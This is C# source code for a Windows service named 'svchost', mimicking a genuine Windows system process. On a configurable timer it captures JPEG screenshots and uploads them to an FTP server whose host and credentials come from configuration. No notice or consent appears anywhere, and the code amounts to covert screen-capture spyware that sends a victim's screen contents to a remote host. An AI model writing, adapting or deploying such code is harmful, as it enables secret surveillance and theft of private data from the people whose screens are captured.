using System;
using System.Collections;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.ServiceProcess;

namespace svchostService
{
	public class svchost : System.ServiceProcess.ServiceBase
	{
		private System.Timers.Timer mytimer;
		private CaptureAndSend.CaptureAndSendTask capture;
		
		/// <summary> 
		/// Required designer variable.
		/// </summary>
		private System.ComponentModel.Container components = null;

		public svchost()
		{
			// This call is required by the Windows.Forms Component Designer.
			InitializeComponent();

			// TODO: Add any initialization after the InitComponent call
		}

		// The main entry point for the process
		static void Main()
		{
			System.ServiceProcess.ServiceBase[] ServicesToRun;
	
			// More than one user Service may run within the same process. To add
			// another service to this process, change the following line to
			// create a second service object. For example,
			//
			//   ServicesToRun = new System.ServiceProcess.ServiceBase[] {new Service1(), new MySecondUserService()};
			//
			ServicesToRun = new System.ServiceProcess.ServiceBase[] { new svchost() };

			System.ServiceProcess.ServiceBase.Run(ServicesToRun);
		}

		/// <summary> 
		/// Required method for Designer support - do not modify 
		/// the contents of this method with the code editor.
		/// </summary>
		private void InitializeComponent()
		{			
			this.capture = new CaptureAndSend.CaptureAndSendTask();

			this.mytimer  = new System.Timers.Timer();
			((System.ComponentModel.ISupportInitialize)(this.mytimer)).BeginInit();

			this.mytimer.Interval = Convert.ToDouble(System.Configuration.ConfigurationSettings.AppSettings["intervalmiliseconds"]);
			this.mytimer.Elapsed +=new System.Timers.ElapsedEventHandler(mytimer_Elapsed);
			
			components = new System.ComponentModel.Container();
			this.ServiceName = "svchost";
			((System.ComponentModel.ISupportInitialize)(this.mytimer)).EndInit();
		}

		private void mytimer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
		{
			string ftphost = System.Configuration.ConfigurationSettings.AppSettings["ftphost"];
			string username = System.Configuration.ConfigurationSettings.AppSettings["username"];
			string password = System.Configuration.ConfigurationSettings.AppSettings["password"];

			this.capture.SingleCaptureJPGAndSendFTP(ftphost,username,password);
	}

		/// <summary>
		/// Clean up any resources being used.
		/// </summary>
		protected override void Dispose( bool disposing )
		{
			if( disposing )
			{
				if (components != null) 
				{
					components.Dispose();
				}
			}
			base.Dispose( disposing );
		}

		/// <summary>
		/// Set things in motion so your service can do its work.
		/// </summary>
		protected override void OnStart(string[] args)
		{
			this.mytimer.Enabled = true;
		}
 
		/// <summary>
		/// Stop this service.
		/// </summary>
		protected override void OnStop()
		{
			this.mytimer.Enabled = false;
		}
	}
}
